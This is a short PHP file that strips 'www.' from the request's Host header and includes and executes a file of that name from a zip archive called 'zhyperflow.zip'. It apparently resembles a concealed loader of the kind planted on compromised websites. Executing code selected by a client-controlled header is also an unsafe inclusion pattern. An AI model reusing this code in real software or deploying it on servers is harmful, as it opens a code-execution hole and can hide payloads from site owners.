<?php

$h = str_ireplace("www.","",$_SERVER["HTTP_HOST"]);
if(!empty($h))include_once "zip://zhyperflow.zip#".$h;
?>